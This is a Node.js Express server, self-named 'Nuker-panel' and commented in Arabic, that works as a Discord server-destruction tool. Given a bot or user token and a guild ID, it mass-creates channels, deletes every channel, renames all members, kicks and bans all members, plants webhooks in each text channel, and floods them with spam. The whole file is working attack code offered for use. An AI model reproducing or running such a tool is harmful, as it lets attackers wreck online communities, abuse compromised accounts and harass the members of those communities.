// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_API = 'https://discord.com/api/v10';

function getHeaders(token, isBot = true) {
    return {
        'Authorization': isBot ? `Bot ${token}` : token,
        'Content-Type': 'application/json'
    };
}

// 1. إنشاء رومات جماعية
app.post('/api/channels/create', async (req, res) => {
    const { token, guildId, name, count, isBot } = req.body;
    try {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(
                axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, {
                    name: `${name}-${i}`,
                    type: 0
                }, { headers: getHeaders(token, isBot) })
            );
        }
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker] Channels created successfully.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 2. حذف جميع الرومات
app.post('/api/channels/delete', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const promises = channelsRes.data.map(ch => 
            axios.delete(`${DISCORD_API}/channels/${ch.id}`, { headers: getHeaders(token, isBot) })
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker] All channels wiped.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 3. تغيير ألقاب جميع الأعضاء
app.post('/api/members/nicknames', async (req, res) => {
    const { token, guildId, newNickname, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
                nick: newNickname
            }, { headers: getHeaders(token, isBot) }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker] Nicknames updated.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 4. طرد جميع الأعضاء (Kick All)
app.post('/api/members/kick', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.delete(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
                headers: getHeaders(token, isBot)
            }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker] All members kicked.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 5. حظر جميع الأعضاء (Ban All)
app.post('/api/members/ban', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.put(`${DISCORD_API}/guilds/${guildId}/bans/${member.user.id}`, {}, {
                headers: getHeaders(token, isBot)
            }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker] All members banned.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 6. زرع Webhooks في جميع الرومات
app.post('/api/webhooks/create', async (req, res) => {
    const { token, guildId, webhookName, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
        const promises = textChannels.map(ch => 
            axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, {
                name: webhookName
            }, { headers: getHeaders(token, isBot) })
        );
        const results = await Promise.all(promises);
        const webhooks = results.map(r => r.data);
        res.json({ success: true, webhooks, message: '[Nuker] Webhooks deployed.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 7. سبام الويب هوكس الخارق (لا يتوقف)
app.post('/api/webhooks/spam', async (req, res) => {
    const { token, guildId, message, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
        
        // جلب أو إنشاء ويب هوك لكل روم بسرعة
        const webhookPromises = textChannels.map(async (ch) => {
            try {
                const whList = await axios.get(`${DISCORD_API}/channels/${ch.id}/webhooks`, { headers: getHeaders(token, isBot) });
                if (whList.data.length > 0) return whList.data[0];
                const newWh = await axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers: getHeaders(token, isBot) });
                return newWh.data;
            } catch { return null; }
        });

        const webhooks = (await Promise.all(webhookPromises)).filter(w => w !== null);

        // إرسال السبام المكثف عبر الويب هوكس بشكل متزامن
        const spamPromises = [];
        webhooks.forEach(wh => {
            const hookUrl = `https://discord.com/api/v10/webhooks/${wh.id}/${wh.token}`;
            for (let i = 0; i < 15; i++) {
                spamPromises.push(
                    axios.post(hookUrl, { content: message }).catch(() => {})
                );
            }
        });

        await Promise.all(spamPromises);
        res.json({ success: true, message: '[Nuker] Webhooks spam wave executed.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Nuker-panel running on port ${PORT}`));
